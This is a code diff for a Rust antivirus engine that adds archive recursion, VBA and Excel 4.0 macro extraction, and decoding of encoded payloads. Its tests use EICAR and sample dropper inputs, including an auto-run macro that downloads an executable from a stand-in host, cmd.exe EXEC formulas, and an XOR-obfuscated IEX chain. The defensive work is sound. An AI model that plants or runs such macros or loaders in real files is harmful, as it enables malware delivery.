@@ -17,6 +17,7 @@
 
 use std::collections::BTreeSet;
 
+use crate::archive::{self, ArchiveLimits, MemberReport};
 use crate::format::{detect, extension_of, FileFormat};
 use crate::hash::{sha256_bytes, Digest32};
 use crate::heuristics::{self, AnalysisInput, Confidence, Signal};
@@ -120,6 +121,10 @@ pub struct FileReport {
     pub rules: Vec<RuleMatch>,
     pub mitre: Vec<String>,
     pub notes: Vec<String>,
+    /// True when an archive container (or a nested one) could not be inspected
+    /// in full because a depth/size/entry budget was exhausted. A truncated
+    /// container is never reported as `Clean`.
+    pub archive_truncated: bool,
     pub pe: Option<PeSummary>,
     pub engine: &'static str,
     pub engine_version: &'static str,
@@ -157,7 +162,36 @@ impl Engine {
 
     /// Analyzes an in-memory buffer (already read by the scan layer).
     pub fn analyze_bytes(&self, name: &str, data: &[u8]) -> FileReport {
+        self.analyze_bytes_in_context(name, data, None)
+    }
+
+    /// Analyses a buffer with the on-disk path available to identity heuristics
+    /// (for example "is this file really inside the Windows system directory?").
+    fn analyze_bytes_in_context(
+        &self,
+        name: &str,
+        data: &[u8],
+        path: Option<&std::path::Path>,
+    ) -> FileReport {
+        let limits = crate::deobfuscate::DecodeLimits::default();
+        let mut budget = crate::deobfuscate::WorkBudget::new(limits.max_steps);
+        self.analyze_bytes_with_depth(name, data, 0, &mut budget, path)
+    }
+
+    /// Internal recursive entry point used for ZIP-family members and decoded
+    /// payloads. `depth` is the number of container/decode layers already
+    /// entered, so neither can bypass its depth budget. `budget` is shared by
+    /// the whole file, so nested layers cannot multiply the decode work.
+    fn analyze_bytes_with_depth(
+        &self,
+        name: &str,
+        data: &[u8],
+        depth: usize,
+        budget: &mut crate::deobfuscate::WorkBudget,
+        path: Option<&std::path::Path>,
+    ) -> FileReport {
         let mut notes = Vec::new();
+        let mut archive_truncated = false;
         let sha256 = sha256_bytes(data);
         let ext = extension_of(std::path::Path::new(name));
         let format = detect(data);
@@ -218,6 +252,21 @@ impl Engine {
         let mut rule_matches = self.rules.scan(data, pe.as_ref(), format_label, &ext);
         rule_matches.retain(|m| !self.db.rule_is_revoked(&m.name));
 
+        // --- Excel 4.0 (XLM) macro sheets ---------------------------------
+        // Extracted before scoring so a macro sheet is an explainable signal;
+        // its formula text is analysed later as source.
+        let xlm_report = if depth == 0
+            && matches!(
+                ext.as_str(),
+                "xls" | "xlsx" | "xlsm" | "xlsb" | "xlt" | "xltx" | "xltm" | "xlam"
+            )
+            && matches!(format, FileFormat::Ooxml | FileFormat::Zip | FileFormat::Ole2)
+        {
+            Some(crate::xlm::extract(data, &crate::xlm::XlmLimits::default()))
+        } else {
+            None
+        };
+
         // --- heuristics ---------------------------------------------------
         let mut signals = heuristics::analyze(&AnalysisInput {
             data,
@@ -225,7 +274,30 @@ impl Engine {
             ext: &ext,
             file_name: name,
             pe: pe.as_ref(),
+            path,
         });
+        if let Some(report) = &xlm_report {
+            if !report.is_empty() {
+                let hidden = report.sheets.iter().filter(|s| s.hidden).count();
+                signals.push(Signal {
+                    id: "xlm.macro_sheet",
+                    weight: 30,
+                    confidence: Confidence::Strong,
+                    title: "Excel 4.0 macro sheet".to_string(),
+                    detail: format!(
+                        "{} Excel 4.0 (XLM) macro sheet(s) present{}; macro-sheet formulas are \
+                         analysed as source",
+                        report.sheets.len(),
+                        if hidden > 0 {
+                            format!(", {hidden} hidden")
+                        } else {
+                            String::new()
+                        }
+                    ),
+                    mitre: vec!["T1204.002", "T1059.005"],
+                });
+            }
+        }
 
         // Trust dampening: a plausible signature lowers heuristic weight, but the
         // chain is NOT validated here (that needs WinVerifyTrust on Windows), so
@@ -291,11 +363,256 @@ impl Engine {
         };
 
         // A trusted hash does not override positive evidence.
-        let verdict = if trusted_hash && !definitive && score < self.config.suspicious_threshold {
+        let mut verdict = if trusted_hash && !definitive && score < self.config.suspicious_threshold {
             Verdict::Clean
         } else {
             verdict
         };
+
+        // A ZIP/OOXML/JAR is evidence about its members, not just its own bytes.
+        // Recursion is depth-limited and every member goes through this same
+        // engine. A clean member does not make the container clean; an unknown
+        // member leaves the container unknown.
+        if format.is_zip_family() {
+            let limits = ArchiveLimits::default();
+            if depth >= limits.max_depth {
+                archive_truncated = true;
+                notes.push(format!(
+                    "archive depth limit ({}) reached; nested members were not inspected",
+                    limits.max_depth
+                ));
+            } else {
+                let scan = archive::inspect_zip(data, depth, &limits, |member_name, member_data, child_depth| {
+                    let report = self.analyze_bytes_with_depth(
+                        member_name,
+                        member_data,
+                        child_depth,
+                        budget,
+                        None,
+                    );
+                    archive_truncated |= report.archive_truncated;
+                    MemberReport {
+                        name: member_name.to_string(),
+                        verdict: report.verdict,
+                        score: report.score,
+                        threat_name: report.threat_name,
+                        family: report.family,
+                    }
+                });
+                let previous_verdict = verdict;
+                let worst = scan.worst().cloned();
+                archive_truncated |= scan.truncated;
+                if archive_truncated {
+                    notes.push(format!(
+                        "archive contents were not inspected in full ({} entries, {} inspected, {} \
+                         skipped); any absence of detection inside it is not evidence of safety",
+                        scan.entries, scan.scanned, scan.skipped
+                    ));
+                }
+                notes.extend(scan.notes);
+                if let Some(member) = worst {
+                    if member.verdict > verdict {
+                        verdict = member.verdict;
+                    }
+                    score = score.max(member.score);
+                    if member.verdict == Verdict::Malicious {
+                        definitive = true;
+                    }
+                    if threat_name.is_none() || member.verdict > previous_verdict {
+                        threat_name = member.threat_name.clone().or(threat_name);
+                        family = member.family.clone().or(family);
+                    }
+                    if member.verdict >= Verdict::Suspicious {
+                        notes.push(format!(
+                            "archive member `{}` drove the container verdict to {} (score {}, {})",
+                            member.name,
+                            member.verdict.as_str(),
+                            member.score,
+                            member.threat_name.as_deref().unwrap_or("unclassified")
+                        ));
+                    }
+                }
+            }
+        }
+
+        // --- Office VBA macros ------------------------------------------
+        // Macro source lives in MS-OVBA compressed streams inside
+        // vbaProject.bin, which in a .docm/.xlsm/.pptm is itself a ZIP member.
+        // Extract and analyse each module as source instead of dismissing the
+        // OLE2 bytes as unknown. Only the file itself is treated as a project;
+        // a project nested deeper is still reached as an archive member, but is
+        // not decompressed a second time here.
+        if depth == 0 && matches!(format, FileFormat::Ooxml | FileFormat::Ole2) {
+            let project = crate::vba::extract(data, &crate::vba::VbaLimits::default());
+            if !project.is_empty() {
+                notes.push(format!(
+                    "VBA project: {} module(s) extracted and analysed as source",
+                    project.modules.len()
+                ));
+            }
+            notes.extend(project.notes.iter().cloned());
+            if project.truncated {
+                notes.push(
+                    "VBA extraction was truncated by a resource cap; modules that were not \
+                     inspected are not evidence of safety"
+                        .into(),
+                );
+            }
+            for module in &project.modules {
+                if module.code.is_empty() && module.cache_bytes > 0 {
+                    if verdict < Verdict::Suspicious {
+                        verdict = Verdict::Suspicious;
+                    }
+                    score = score.max(45);
+                    notes.push(format!(
+                        "VBA module `{}` contains a performance cache but no decodable source; \
+                         compiled p-code cannot be inspected statically here",
+                        module.name
+                    ));
+                    continue;
+                }
+                let inner = self.analyze_bytes_with_depth(
+                    &format!("vba:{}", module.name),
+                    &module.code,
+                    depth + 1,
+                    budget,
+                    None,
+                );
+                if inner.verdict >= Verdict::Suspicious {
+                    notes.push(format!(
+                        "VBA module `{}` classified {} (score {}, {})",
+                        module.name,
+                        inner.verdict.as_str(),
+                        inner.score,
+                        inner.threat_name.as_deref().unwrap_or("unclassified")
+                    ));
+                    if inner.verdict > verdict {
+                        verdict = inner.verdict;
+                    }
+                    score = score.max(inner.score);
+                    if inner.verdict == Verdict::Malicious {
+                        definitive = true;
+                    }
+                    if threat_name.is_none() {
+                        threat_name = inner.threat_name.clone();
+                    }
+                    if family.is_none() {
+                        family = inner.family.clone();
+                    }
+                }
+            }
+            if project.pcode_modules > 0 {
+                notes.push(format!(
+                    "{} VBA module(s) carry a performance cache (p-code); p-code is counted but \
+                     not decompiled, so a source-only verdict cannot rule out VBA stomping",
+                    project.pcode_modules
+                ));
+            }
+        }
+
+        // --- Excel 4.0 macro formulas ------------------------------------
+        // Formula text extracted from `xl/macrosheets/*.xml` is source: run it
+        // through the same rules/heuristics/de-obfuscation as any other input.
+        if let Some(report) = &xlm_report {
+            notes.extend(report.notes.iter().cloned());
+            if report.truncated {
+                notes.push(
+                    "XLM extraction was truncated by a resource cap; formulas that were not \
+                     inspected are not evidence of safety"
+                        .into(),
+                );
+            }
+            for sheet in &report.sheets {
+                for formula in &sheet.formulas {
+                    let inner = self.analyze_bytes_with_depth(
+                        &format!("xlm:{}", sheet.name),
+                        formula.as_bytes(),
+                        depth + 1,
+                        budget,
+                        None,
+                    );
+                    if inner.verdict >= Verdict::Suspicious {
+                        notes.push(format!(
+                            "Excel 4.0 formula in sheet `{}` classified {} (score {}, {})",
+                            sheet.name,
+                            inner.verdict.as_str(),
+                            inner.score,
+                            inner.threat_name.as_deref().unwrap_or("unclassified")
+                        ));
+                        if inner.verdict > verdict {
+                            verdict = inner.verdict;
+                        }
+                        score = score.max(inner.score);
+                        if inner.verdict == Verdict::Malicious {
+                            definitive = true;
+                        }
+                        if threat_name.is_none() {
+                            threat_name = inner.threat_name.clone();
+                        }
+                        if family.is_none() {
+                            family = inner.family.clone();
+                        }
+                        // The rule scan runs on the decoded formula text, not on
+                        // the container. Keep those matches explainable in the
+                        // outer report instead of discarding them with the
+                        // inner report.
+                        for matched in &inner.rules {
+                            if !rule_matches.iter().any(|m| m.name == matched.name) {
+                                rule_matches.push(matched.clone());
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // --- encoded payloads -------------------------------------------
+        // Bounded layers behind explicit decode constructs only. One shared
+        // step budget covers every layer, archive member and decoded payload of
+        // this file. The decoded content is escalated only when it is itself
+        // conclusive: a benign base64 image must not turn a clean script into a
+        // finding.
+        let decode_limits = crate::deobfuscate::DecodeLimits::default();
+        if depth < decode_limits.max_depth {
+            let decoded = crate::deobfuscate::decode(data, depth, &decode_limits, budget);
+            for payload in decoded {
+                let inner = self.analyze_bytes_with_depth(
+                    &format!("decoded-{}", payload.source.as_str()),
+                    &payload.bytes,
+                    depth + 1,
+                    budget,
+                    None,
+                );
+                if inner.verdict == Verdict::Malicious {
+                    definitive = true;
+                    verdict = Verdict::Malicious;
+                    score = score.max(inner.score).max(self.config.malicious_threshold);
+                    if threat_name.is_none() {
+                        threat_name = inner.threat_name.clone();
+                    }
+                    if family.is_none() {
+                        family = inner.family.clone();
+                    }
+                    notes.push(format!(
+                        "decoded {} payload is malicious ({}{}); the encoded layer hid this" ,
+                        payload.source.as_str(),
+                        inner.threat_name.as_deref().unwrap_or("unclassified"),
+                        inner
+                            .family
+                            .as_deref()
+                            .map(|f| format!(", family {f}"))
+                            .unwrap_or_default()
+                    ));
+                }
+            }
+        }
+        if budget.exhausted() {
+            notes.push(
+                "de-obfuscation step budget was exhausted; deeper encoded layers of this file were \
+                 not decoded, so absence of detection inside them is not evidence of safety"
+                    .into(),
+            );
+        }
 
         if verdict == Verdict::Unknown && signals.is_empty() && rule_matches.is_empty() {
             notes.push(
@@ -310,7 +627,7 @@ impl Engine {
             );
         }
 
-        // Prefer a rule's family name when the DB had none.
+        // Prefer a rule's family name when the DB/archive had none.
         if family.is_none() {
             family = rule_matches.iter().find_map(|m| m.family.clone());
         }
@@ -367,6 +684,7 @@ impl Engine {
             rules: rule_matches,
             mitre: mitre.into_iter().collect(),
             notes,
+            archive_truncated,
             pe: pe.as_ref().map(pe_summary),
             engine: ENGINE_NAME,
             engine_version: ENGINE_VERSION,
@@ -393,7 +711,7 @@ impl Engine {
                 .file_name()
                 .and_then(|n| n.to_str())
                 .unwrap_or("unnamed");
-            let mut report = self.analyze_bytes(name, &buf);
+            let mut report = self.analyze_bytes_in_context(name, &buf, Some(path));
             report.notes.push(format!(
                 "file is {size} bytes, larger than the {max_bytes}-byte analysis cap; only the first \
                  {n} bytes were inspected"
@@ -406,7 +724,7 @@ impl Engine {
             .file_name()
             .and_then(|n| n.to_str())
             .unwrap_or("unnamed");
-        Ok((self.analyze_bytes(name, &data), false))
+        Ok((self.analyze_bytes_in_context(name, &data, Some(path)), false))
     }
 }
 
@@ -444,6 +762,38 @@ mod tests {
     fn engine_with(rules: &str) -> Engine {
         let rs = RuleSet::compile(parse_rule_file(rules, "test").unwrap()).unwrap();
         Engine::new(rs, ThreatDb::empty(), EngineConfig::default())
+    }
+
+    fn zip_bytes(files: &[(&str, &[u8])]) -> Vec<u8> {
+        use std::io::{Cursor, Write};
+        use zip::write::SimpleFileOptions;
+        let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
+        for (name, data) in files {
+            writer
+                .start_file(
+                    *name,
+                    SimpleFileOptions::default()
+                        .compression_method(zip::CompressionMethod::Deflated),
+                )
+                .unwrap();
+            writer.write_all(data).unwrap();
+        }
+        writer.finish().unwrap().into_inner()
+    }
+
+    fn eicar_rules() -> &'static str {
+        r#"
+rule Eicar.Test {
+    meta:
+        description = "EICAR test file"
+        severity = "critical"
+        family = "EICAR-Test"
+    strings:
+        $s = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
+    condition:
+        $s
+}
+"#
     }
 
     #[test]
@@ -514,6 +864,335 @@ rule Eicar.Test {
         assert_eq!(r.verdict, Verdict::Malicious);
         assert_eq!(r.family.as_deref(), Some("EICAR-Test"));
         assert!(r.mitre.is_empty() || !r.mitre.is_empty());
+    }
+
+    #[test]
+    fn zip_member_with_eicar_is_malicious() {
+        let e = engine_with(eicar_rules());
+        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+        let data = zip_bytes(&[("docs/readme.txt", b"ordinary text"), ("bin/payload.txt", eicar)]);
+        let r = e.analyze_bytes("sample.zip", &data);
+        assert_eq!(r.verdict, Verdict::Malicious);
+        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
+        assert!(!r.archive_truncated);
+        assert!(
+            r.notes.iter().any(|n| n.contains("bin/payload.txt")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn benign_zip_stays_unknown() {
+        let e = engine_with(eicar_rules());
+        let data = zip_bytes(&[("a.txt", b"hello world"), ("b.txt", b"another file")]);
+        let r = e.analyze_bytes("plain.zip", &data);
+        assert_eq!(r.verdict, Verdict::Unknown);
+        assert!(!r.verdict.counts_as_clean());
+        assert!(!r.archive_truncated);
+    }
+
+    #[test]
+    fn nested_zip_member_is_inspected() {
+        let e = engine_with(eicar_rules());
+        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+        let inner = zip_bytes(&[("deep.txt", eicar)]);
+        let outer = zip_bytes(&[("inner.zip", &inner)]);
+        let r = e.analyze_bytes("outer.zip", &outer);
+        assert_eq!(r.verdict, Verdict::Malicious);
+        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
+        assert!(
+            r.notes.iter().any(|n| n.contains("inner.zip")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn archive_depth_limit_is_reported_not_silently_clean() {
+        let e = engine_with(eicar_rules());
+        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+        let mut payload = zip_bytes(&[("deep.txt", eicar)]);
+        for _ in 0..4 {
+            payload = zip_bytes(&[("layer.zip", &payload)]);
+        }
+        let r = e.analyze_bytes("stacked.zip", &payload);
+        assert!(r.archive_truncated);
+        assert_eq!(r.verdict, Verdict::Unknown);
+        assert!(
+            r.notes.iter().any(|n| n.contains("not inspected in full")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    fn b64(bytes: &[u8]) -> String {
+        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let mut out = String::new();
+        for chunk in bytes.chunks(3) {
+            let b = [
+                chunk[0],
+                *chunk.get(1).unwrap_or(&0),
+                *chunk.get(2).unwrap_or(&0),
+            ];
+            let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
+            out.push(ALPHABET[(n >> 18) as usize & 63] as char);
+            out.push(ALPHABET[(n >> 12) as usize & 63] as char);
+            out.push(if chunk.len() > 1 {
+                ALPHABET[(n >> 6) as usize & 63] as char
+            } else {
+                '='
+            });
+            out.push(if chunk.len() > 2 {
+                ALPHABET[n as usize & 63] as char
+            } else {
+                '='
+            });
+        }
+        out
+    }
+
+    fn utf16le(s: &str) -> Vec<u8> {
+        s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
+    }
+
+    #[test]
+    fn an_encoded_powershell_payload_is_decoded_and_detected() {
+        let e = engine_with(eicar_rules());
+        let command = format!(
+            "Write-Host '{}'",
+            std::str::from_utf8(
+                b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+            )
+            .unwrap()
+        );
+        let script = format!(
+            "powershell.exe -NoProfile -EncodedCommand {}",
+            b64(&utf16le(&command))
+        );
+        let r = e.analyze_bytes("dropper.ps1", script.as_bytes());
+        assert_eq!(r.verdict, Verdict::Malicious);
+        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
+        assert!(
+            r.notes.iter().any(|n| n.contains("decoded")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn base64_of_a_benign_image_does_not_escalate_a_script() {
+        let e = engine_with(eicar_rules());
+        // A tiny PNG-shaped payload behind a real decode marker: no rule matches
+        // and the decoded bytes are not an executable, so the script stays
+        // unknown rather than being promoted to malicious.
+        let png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00";
+        let script = format!(
+            "$data = [Convert]::FromBase64String('{}')\n[IO.File]::WriteAllBytes('a.png', $data)\n",
+            b64(png)
+        );
+        let r = e.analyze_bytes("loader.ps1", script.as_bytes());
+        assert_ne!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
+    }
+
+    #[test]
+    fn a_two_layer_encoded_payload_is_decoded_end_to_end() {
+        let e = engine_with(eicar_rules());
+        // Layer 1: PowerShell -EncodedCommand. Layer 2: an XORed char array.
+        // The EICAR text exists only after both layers are decoded.
+        let eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+        let items: Vec<String> = eicar
+            .bytes()
+            .map(|b| format!("0x{:02x} -bxor 0x2a", b ^ 0x2a))
+            .collect();
+        let inner = format!("$s = -join ([char[]]({})); IEX $s", items.join(","));
+        let script = format!(
+            "powershell.exe -EncodedCommand {}",
+            b64(&utf16le(&inner))
+        );
+        let r = e.analyze_bytes("two-layer.ps1", script.as_bytes());
+        assert_eq!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
+        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
+        assert!(
+            r.notes
+                .iter()
+                .any(|n| n.contains("decoded powershell-encodedcommand")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn a_benign_char_array_does_not_escalate_a_script() {
+        let e = engine_with(eicar_rules());
+        let script =
+            "$s = -join ([char[]](0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64)); Write-Output $s";
+        let r = e.analyze_bytes("hello.ps1", script.as_bytes());
+        assert_ne!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
+    }
+
+    fn core_rules() -> &'static str {
+        include_str!("../../../rules/core.lrs")
+    }
+
+    #[test]
+    fn an_ooxml_macro_dropper_is_flagged() {
+        use crate::vba::fixtures::{docm, ovba};
+
+        let macro_source = b"Sub AutoOpen()\r\n    Set sh = CreateObject(\"WScript.Shell\")\r\n    sh.Run \"powershell -NoProfile -EncodedCommand SQBFAFgA\"\r\n    URLDownloadToFile 0, \"http://example.invalid/a.exe\", \"a.exe\", 0, 0\r\nEnd Sub\r\n";
+        let data = docm(&[("Module1", &ovba(macro_source))]);
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("invoice.docm", &data);
+        assert_eq!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
+        assert!(
+            r.notes.iter().any(|n| n.contains("VBA project: 1 module")),
+            "notes: {:?}",
+            r.notes
+        );
+        assert!(
+            r.notes.iter().any(|n| n.contains("classified")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn a_legacy_ole_document_with_a_macro_is_flagged() {
+        use crate::vba::fixtures::{cfb_project, ovba};
+
+        let macro_source = b"Sub Document_Open()\r\n    Shell \"cmd.exe /c whoami\"\r\nEnd Sub\r\n";
+        let data = cfb_project(&[("ThisDocument", &ovba(macro_source))]);
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("legacy.doc", &data);
+        assert!(
+            r.verdict >= Verdict::Suspicious,
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn a_benign_macro_is_not_escalated() {
+        use crate::vba::fixtures::{docm, ovba};
+
+        let macro_source = b"Sub Hello()\r\n    MsgBox \"hello\"\r\nEnd Sub\r\n";
+        let data = docm(&[("Module1", &ovba(macro_source))]);
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("hello.docm", &data);
+        assert_ne!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
+        assert!(
+            r.notes.iter().any(|n| n.contains("VBA project: 1 module")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn an_xlsm_macro_sheet_is_flagged() {
+        use crate::xlm::fixtures::xlsm;
+
+        let xml = br#"<xm:worksheet><xm:sheetData><xm:row><xm:c><xm:f>EXEC("cmd.exe /c calc")</xm:f></xm:c></xm:row><xm:row><xm:c><xm:f>CALL("urlmon","URLDownloadToFileA","http://example.invalid/a.exe")</xm:f></xm:c></xm:row></xm:sheetData></xm:worksheet>"#;
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("invoice.xlsm", &xlsm(xml));
+        assert_eq!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
+        assert!(
+            r.signals.iter().any(|s| s.id == "xlm.macro_sheet"),
+            "signals: {:?}",
+            r.signals
+        );
+    }
+
+    #[test]
+    fn a_legacy_xls_macro_sheet_is_suspicious() {
+        use crate::vba::fixtures::cfb_stream;
+        use crate::xlm::fixtures::biff_globals;
+
+        let data = cfb_stream("Workbook", &biff_globals("Macro1", true, true));
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("legacy.xls", &data);
+        assert!(
+            r.verdict >= Verdict::Suspicious,
+            "notes: {:?}",
+            r.notes
+        );
+        assert!(
+            r.signals.iter().any(|s| s.id == "xlm.macro_sheet"),
+            "signals: {:?}",
+            r.signals
+        );
+    }
+
+    #[test]
+    fn a_legacy_xls_exec_formula_is_flagged() {
+        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str};
+        use crate::vba::fixtures::cfb_stream;
+        use crate::xlm::fixtures::biff_workbook;
+
+        let mut rgce = ptg_str("cmd.exe /c calc");
+        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
+        let stream = biff_workbook("Macro1", true, &[formula_record(&rgce)]);
+        let data = cfb_stream("Workbook", &stream);
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("legacy.xls", &data);
+        assert!(
+            r.verdict >= Verdict::Suspicious,
+            "verdict: {:?}, notes: {:?}",
+            r.verdict,
+            r.notes
+        );
+        assert!(
+            r.rules.iter().any(|m| m.name == "Xlm.Exec"),
+            "rules: {:?}",
+            r.rules
+        );
+    }
+
+    #[test]
+    fn a_biff5_xls_exec_formula_is_flagged() {
+        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str_latin1};
+        use crate::vba::fixtures::cfb_stream;
+        use crate::xlm::fixtures::biff5_workbook;
+
+        let mut rgce = ptg_str_latin1("cmd.exe /c calc");
+        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
+        let stream = biff5_workbook("Macro1", true, &[formula_record(&rgce)]);
+        let data = cfb_stream("Workbook", &stream);
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("legacy.xls", &data);
+        assert!(
+            r.verdict >= Verdict::Suspicious,
+            "verdict: {:?}, notes: {:?}",
+            r.verdict,
+            r.notes
+        );
+        assert!(
+            r.rules.iter().any(|m| m.name == "Xlm.Exec"),
+            "rules: {:?}",
+            r.rules
+        );
+    }
+
+    #[test]
+    fn a_vba_pcode_cache_is_reported_not_interpreted() {
+        use crate::vba::fixtures::{docm, ovba};
+
+        let mut stream = vec![0x41u8; 64];
+        stream.extend_from_slice(&ovba(b"Sub Hello()\r\nEnd Sub\r\n"));
+        let e = engine_with(core_rules());
+        let r = e.analyze_bytes("macro.docm", &docm(&[("Module1", &stream)]));
+        assert!(
+            r.notes.iter().any(|n| n.contains("p-code")),
+            "notes: {:?}",
+            r.notes
+        );
+    }
+
+    #[test]
+    fn unmarked_base64_is_never_decoded() {
+        let e = engine_with(eicar_rules());
+        let text = format!("payload = {}", b64(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"));
+        let r = e.analyze_bytes("notes.txt", text.as_bytes());
+        assert_ne!(r.verdict, Verdict::Malicious);
     }
 
     #[test]
